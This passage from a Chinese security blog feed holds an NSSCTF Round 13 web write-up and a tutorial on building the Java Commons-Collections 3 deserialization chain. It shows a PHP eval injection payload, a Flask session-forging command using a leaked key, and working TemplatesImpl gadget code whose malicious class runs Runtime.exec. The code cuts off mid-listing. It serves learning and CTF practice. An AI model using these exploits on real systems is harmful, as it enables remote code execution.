class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"><span class="comment">// å†™äº†ä¸ªç½‘é¡µå­˜å‚¨JSONæ•°æ®ï¼Œä½†æ˜¯è¿˜ä¸ä¼šå¤„ç†jsonæ ¼å¼ï¼Œè¿™æ ·å¤„ç†åº”è¯¥æ²¡æœ‰ä»€ä¹ˆé—®é¢˜å§</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;mode&#x27;</span>] == <span class="string">&#x27;save&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/tmp/data.json&#x27;</span>);</span><br><span class="line">    <span class="variable">$value</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;value&#x27;</span>]);</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;]&#x27;</span>, <span class="string">&quot;, &#x27;<span class="subst">$value</span>&#x27;]&quot;</span>, <span class="variable">$data</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;/tmp/data.json&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;mode&#x27;</span>] == <span class="string">&#x27;read&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/tmp/data.json&#x27;</span>);</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;$data = &#x27;</span> . <span class="variable">$data</span> . <span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="variable">$data</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¤ç°ç¯å¢ƒå‡ºäº†é—®é¢˜ï¼Œå…¶å®è¿™ä¸ªé¢˜å°±æ˜¯æŠŠåŸæ¥çš„æ•°æ®ç»™é—­åˆæ‰å°±èƒ½å‘½ä»¤æ‰§è¡Œäº†ï¼ŒçŒœæµ‹å®ƒå‚¨å­˜çš„jsonæ•°æ®æ ¼å¼ä¸º<code>[1,2,3,â€¦â€¦]</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?mode=save&amp;value=];%0aecho cat /flag;%0a[</span><br><span class="line">?mode=read</span><br></pre></td></tr></table></figure><p>æ–¹å¼ä¸æ­¢è¿™ä¸€ä¸ªå› ä¸ºç¯å¢ƒé—®é¢˜ä¹Ÿæ²¡å»ä¸€ä¸ªä¸ªéªŒè¯äº†</p><h2 id="flask-jwt-hard"><a href="#flask-jwt-hard" class="headerlink" title="flask?jwt?(hard)"></a>flask?jwt?(hard)</h2><p>ç™»å½•åæºç ä¸­ç»™äº†ä¸€ä¸ª&#x2F;worè·¯ç”±ï¼Œè®¿é—®å‘ç°æ²¡å•¥ä¸œè¥¿ï¼Œç„¶åæŠŠsessionéšä¾¿åˆ é™¤ç‚¹ä¸œè¥¿é¡µé¢æŠ¥é”™ï¼Œå¼€å¯äº†debugåœ¨æºç ä¸­æ‰¾åˆ°key <code>hardgam3_C0u1d_u_f1ndM3????&#39;</code><br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306042150428.png" alt="image-20230604215051392"><br>æ¥ä¸‹æ¥å°±å’Œå‰é¢ä¸€æ ·ä¼ªé€ sessionå°±è¡Œäº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py decode -s hardgam3_C0u1d_u_f1ndM3???? -c &quot;session&quot;</span><br><span class="line"></span><br><span class="line">python flask_session_cookie_manager3.py encode -s hardgam3_C0u1d_u_f1ndM3???? -t &quot;&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: &#x27;0e382100446e160095f79a16dd0bceddee884c4d84dcc9e53bfb47d206175ad1c5005f21630c2892c78a7e4985b69503704833e18205e6eacc9dbb58aa7b3e85&#x27;, &#x27;_user_id&#x27;: &#x27;1&#x27;&#125;&quot;</span><br><span class="line">//ä¼ªé€ çš„æ—¶å€™æŠŠtimeåˆ é™¤ï¼Œä¸ç„¶ä¼šæŠ¥é”™</span><br></pre></td></tr></table></figure><h2 id="TimeTrcer"><a href="#TimeTrcer" class="headerlink" title="TimeTrcer"></a>TimeTrcer</h2><p>0è§£é¢˜ï¼Œçœ‹äº†wpæœ‰ç‚¹éš¾ï¼Œä¸æƒ³å¤ç°äº†<br>wpï¼š<a href="https://gtg.ink/2023/06/NSSCTFround13WP-TimeTrcer/">https://gtg.ink/2023/06/NSSCTFround13WP-TimeTrcer/</a></p><p>å‚è€ƒï¼š<br><a href="https://www.cnblogs.com/F12-blog/p/17455819.html">NSSCTF Round#13 webä¸“é¡¹ - F12~ - åšå®¢å›­ (cnblogs.com)</a><br><a href="https://ph0ebus.cn/post/NSSRound13%20WEB.html#ez_factors">NSSCTFRound#13 Web Â· ph0ebusâ€™s Blog</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Javaå­¦ä¹ ä¹‹CCé“¾3</title>
      <link href="/undefined/28758.html"/>
      <url>/undefined/28758.html</url>
      
        <content type="html"><![CDATA[<h2 id="ç¯å¢ƒå‡†å¤‡"><a href="#ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ç¯å¢ƒå‡†å¤‡"></a>ç¯å¢ƒå‡†å¤‡</h2><ul><li>jdk8u65</li><li>Commons-Collections 3.2.1</li></ul><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>æœ€è¿‘å‡ å‘¨æ²¡ç¢°Javaæ„Ÿè§‰åˆæœ‰ç‚¹ç”Ÿç–äº†ï¼Œåœ¨CC3ä¸­å‘½ä»¤æ‰§è¡Œçš„æ–¹æ³•å’Œ1ï¼Œ6ä¸ä¸€æ ·ï¼Œè¿™é‡Œç”¨çš„æ˜¯åŠ¨æ€ç±»åŠ è½½ï¼Œä½¿ç”¨<code>defineClass-&gt;newInstance</code> æ¥å‘½ä»¤æ‰§è¡Œå³åœ¨å­—èŠ‚é‡Œé¢åŠ è½½ä¸€ä¸ªç±»ç„¶åå®ä¾‹åŒ–æ‰§è¡Œä»£ç ï¼Œæ‰€ä»¥ç›´æ¥ä»è¿™é‡Œå…¥æ‰‹é€†æ¨ï¼Œè¿˜æ˜¯find usageså¯»æ‰¾å“ªé‡Œè°ƒç”¨äº†defineClassï¼Œå› ä¸ºå®ƒæ˜¯ä¸€ä¸ªprotectedæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸€ä¸ªè°ƒç”¨å®ƒpublicæ–¹æ³•ï¼Œæœ€ç»ˆåœ¨TemplatesImplç±»çš„<code>static final class TransletClassLoader</code>ä¸‹æ‰¾åˆ°defineClassè¿™é‡Œæ²¡æœ‰æ ‡æ³¨ä½œç”¨åŸŸå³é»˜è®¤ä¸ºdefalutï¼Œä¹Ÿå°±æ˜¯è‡ªå·±çš„ç±»é‡Œé¢å¯ä»¥è°ƒç”¨<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306031733679.png" alt="image-20230603173329428"><br>ç»§ç»­find usageså‘ç°defineTransletClassesç§æœ‰æ–¹æ³•é‡Œé¢è°ƒç”¨äº†<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306031733726.png" alt="image-20230603173354505"><br>è¿™é‡Œ<code>_bytecodes</code>ä¸èƒ½ä¸ºç©ºä¸ç„¶å°±ä¸èƒ½æ‰§è¡Œåˆ°defineClassæ–¹æ³•äº†ï¼Œç„¶åç»§ç»­find usagesæœ€ç»ˆæ‰¾åˆ°äº†getTransletInstanceæ–¹æ³•å¹¶ä¸”è¿™é‡Œæœ‰ä¸ª<code>newInstance()</code>å®ä¾‹åŒ–çš„è¿‡ç¨‹ï¼ŒåŠ¨æ€æ‰§è¡Œä»£ç æ­£å¥½éœ€è¦å®ä¾‹åŒ–ï¼Œæ‰€ä»¥å¦‚æœèµ°å®Œè¿™ä¸ªå‡½æ•°å°±ç›¸å½“äºç»“æŸäº†ï¼Œä½†æ˜¯è¿™ä¸ªgetTransletInstanceæ–¹æ³•æ˜¯ç§æœ‰ï¼Œæ‰€ä»¥è¿˜å¾—ç»§ç»­æ‰¾ï¼Œæœ€ç»ˆæ‰¾åˆ°äº†newTransformeræ–¹æ³•ï¼Œé‡Œé¢è°ƒç”¨äº†getTransletInstanceæ–¹æ³•ï¼Œå¹¶ä¸”newTransformeræ–¹æ³•æ˜¯publicï¼Œæ¥ä¸‹æ¥å°±æ˜¯åˆ©ç”¨äº†<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306031734855.png" alt="image-20230603173407614"></p><h2 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">templates.newTransformer();</span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä¸¤è¡Œä»£ç å…¶å®å°±æ˜¯å‘½ä»¤æ‰§è¡Œçš„ä»£ç ï¼Œä½†æ˜¯è‚¯å®šæœ‰å¾ˆå¤šé™åˆ¶æ¡ä»¶è®©å®ƒæ— æ³•æ‰§è¡Œï¼Œæ‰€ä»¥æ¥ä¸‹æ¥å°±æ˜¯æ»¡è¶³æ‰€æœ‰æ¡ä»¶è®©å®ƒæ‰§è¡Œï¼Œé¦–å…ˆæ˜¯ä¸‹é¢çš„è¿™äº›æ¡ä»¶<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306031734199.png" alt="image-20230603173436099"><br><code>_name</code>ä¸èƒ½ä¸ºç©ºï¼Œ<code>_class</code>å¿…é¡»ä¸ºç©ºè¿™æ ·æ‰èƒ½è¿›å…¥<code>defineTransletClasses()</code>æ–¹æ³•ï¼Œç„¶åè·Ÿè¿›è¿™ä¸ªæ–¹æ³•<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306031734897.png" alt="image-20230603173450789"><br><code>_bytecodes</code>ä¸èƒ½ä¸ºç©ºï¼Œå¦åˆ™æŠ›å¼‚å¸¸ï¼Œ<code>_tfactory</code>éœ€è¦è°ƒæ–¹æ³•æ‰€ä»¥ä¹Ÿéœ€è¦èµ‹å€¼ï¼Œç„¶åå¼€å§‹æ„é€ EXP</p><h2 id="æ„é€ EXP"><a href="#æ„é€ EXP" class="headerlink" title="æ„é€ EXP"></a>æ„é€ EXP</h2><p>é€šè¿‡åå°„è·å–å±æ€§ï¼Œ<code>_name</code>çš„å€¼æ˜¯Stringå…ˆéšä¾¿èµ‹ä¸€ä¸ªï¼Œ<code>_class</code>åˆå§‹å€¼å°±ä¸ºç©ºä¸ç”¨ç®¡ï¼Œç„¶åæ˜¯<code>_bytecodes</code>æ˜¯ä¸€ä¸ªäºŒç»´æ•°ç»„ï¼Œä½†æ˜¯ä¼ å…¥defineClassæ–¹æ³•çš„å€¼æ˜¯ä¸€ç»´æ•°ç»„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Class <span class="title function_">defineClass</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] b)</span> &#123;  </span><br><span class="line">    <span class="keyword">return</span> defineClass(<span class="literal">null</span>, b, <span class="number">0</span>, b.length);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€Œè¿™ä¸ªä¸€ç»´æ•°ç»„å­˜æ”¾çš„æ˜¯æ¶æ„å­—èŠ‚ç ï¼Œä¹Ÿå°±æ˜¯å‘½ä»¤æ‰§è¡Œçš„classæ–‡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆæŠŠè¿™ä¸ªå†™å®Œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;  </span><br><span class="line">    <span class="keyword">static</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªä¹Ÿå¯ä»¥æ”¾æ„é€ å‡½æ•°é‡Œé¢ï¼Œå®ä¾‹åŒ–çš„æ—¶å€™èƒ½åŠ è½½å°±è¡Œï¼Œè¿™éƒ¨åˆ†å¯¹äºçš„ä»£ç å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\java-tools\\CCé“¾\\CC3\\&quot;</span>));  </span><br><span class="line"><span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±å®Œæˆäº†äºŒç»´æ•°ç»„èµ‹å€¼ï¼Œä¼ ç»™defineClassæ–¹æ³•çš„ä¹Ÿæ˜¯å­˜æ”¾æ¶æ„å­—èŠ‚ç çš„ä¸€ç»´æ•°ç»„<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306031735515.png" alt="image-20230603173507470"><br>å¾ªç¯å–å€¼ï¼Œç›¸å½“äºç¬¬ä¸€ä¸ªå€¼å°±æ˜¯å­˜æ”¾æ¶æ„å­—èŠ‚ç çš„ä¸€ç»´æ•°ç»„ï¼Œè¿™ä¸ª<code>_bytecodes</code>èµ‹å€¼å°±è§£å†³äº†<br>ç„¶åæ˜¯<code>_tfactory</code>èµ‹å€¼ï¼Œå®ƒçš„å®šä¹‰å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> <span class="type">TransformerFactoryImpl</span> <span class="variable">_tfactory</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br></pre></td></tr></table></figure><p>æœ‰ä¸ªtransientè¡¨ç¤ºå®ƒæ˜¯ä¸ªä¸å¯åºåˆ—åŒ–çš„å˜é‡ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¼ å€¼å°±æ²¡æœ‰æ„ä¹‰äº†ï¼Œååºåˆ—åŒ–çš„æ—¶å€™å°±ä¼šä¸¢å¤±ï¼Œæœ€ååœ¨readObjectä¸­æ‰¾åˆ°å®ƒçš„åˆå§‹å®šä¹‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_tfactory = <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>();</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¸ä¸ºç©ºï¼Œæ‰€ä»¥ç›´æ¥åå°„èµ‹å€¼ä¸ºTransformerFactoryImplå³å¯ï¼Œåˆ°è¿™é‡Œè¯¥æ»¡è¶³çš„æ¡ä»¶éƒ½æ»¡è¶³äº†ï¼Œä»£ç å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">tclass</span> <span class="operator">=</span> templates.getClass();  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);  </span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);  </span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://java-tools/test.class&quot;</span>));  </span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;  </span><br><span class="line">        bytecodes.set(templates,codes);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);  </span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">  </span><br><span class="line">        templates.newTransformer();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯åˆ°è¿™é‡ŒæŠ¥äº†ç©ºæŒ‡é’ˆé”™è¯¯<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306031735495.png" alt="image-20230603173521394"><br>æœ¬æ¥æƒ³è°ƒè¯•ä¸€ä¸‹ï¼Œä½†æ˜¯å‘ç°ç¯å¢ƒå¥½åƒæœ‰ç‚¹é—®é¢˜ä¸èƒ½åœ¨è¿™ä¸ªç±»ä¸‹è°ƒè¯•ï¼Œç›´æ¥å»422çœ‹æŠ¥é”™ä¹Ÿè¡Œï¼Œ<br>åœ¨418è¡Œä¼šåˆ¤æ–­æ¶æ„ç±»æ˜¯å¦ç»§æ‰¿äº†ABSTRACT_TRANSLETè¿™ä¸ªç±»å¦åˆ™æŠ¥é”™ï¼Œå³<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET))</span><br></pre></td></tr></table></figure><p>æˆ–è€…æˆ‘ä»¬ç»™<code>_auxClasses</code>èµ‹å€¼è®©å®ƒä¸ä¸ºç©ºï¼Œä½†æ˜¯è¿™æ ·<code>_transletIndex</code>ä¸º-1ä¼šåœ¨ä¸‹é¢çš„åˆ¤æ–­ç›´æ¥è·³å‡ºç¨‹åºï¼Œè¿™ä¸ªæ–¹æ³•å°±ä¸å¯å–ï¼Œæ‰€ä»¥ç›´æ¥è®©æ¶æ„ç±»ç»§æ‰¿AbstractTransletç±»ï¼Œå¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span>&#123;  </span><br><span class="line">    <span class="keyword">static</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;  </span><br><span class="line">          </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œä»£ç å¼¹å‡ºæˆåŠŸ<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306031735250.png" alt="image-20230603173533124"></p><h2 id="CC1-çš„TemplatesImplçš„å®ç°æ–¹å¼"><a href="#CC1-çš„TemplatesImplçš„å®ç°æ–¹å¼" class="headerlink" title="CC1 çš„TemplatesImplçš„å®ç°æ–¹å¼"></a>CC1 çš„TemplatesImplçš„å®ç°æ–¹å¼</h2><p>ç”±äºä¸Šé¢çš„éƒ¨åˆ†æˆ‘ä»¬åªæ˜¯æ›´æ”¹çš„æœ€åå‘½ä»¤æ‰§è¡Œçš„æ–¹æ³•ï¼Œå‰é¢çš„é“¾å­ä»ç„¶æ²¡æœ‰å˜ï¼Œæ‰€ä»¥è¿™é‡Œå’ŒCC1çš„å‰åŠæ®µç»“åˆä¸€ä¸‹ï¼Œä»£ç å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">tclass</span> <span class="operator">=</span> templates.getClass();  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);  </span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);  </span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://java-tools/test.class&quot;</span>));  </span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;  </span><br><span class="line">        bytecodes.set(templates,codes);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);  </span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//        templates.newTransformer();  </span></span><br><span class="line">  </span><br><span class="line">        Transformer[] transformers= <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">        chainedTransformer.transform(<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//æœ€åè¿™é‡Œèµ‹å€¼æ˜¯å› ä¸ºnew ConstantTransformer(templates)è¿™é‡Œå®šä¹‰çš„ç±»éœ€è¦ä¸€ä¸ªå‚æ•°</span></span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202306031735670.png" alt="image-20230603173548540"><br>ç„¶åæŠŠCC1åé¢çš„å…¨éƒ¨æ‹¿è¿‡æ¥</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">tclass</span> <span class="operator">=</span> templates.getClass();  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);  </span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tclass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);  </span><br><span class="line">        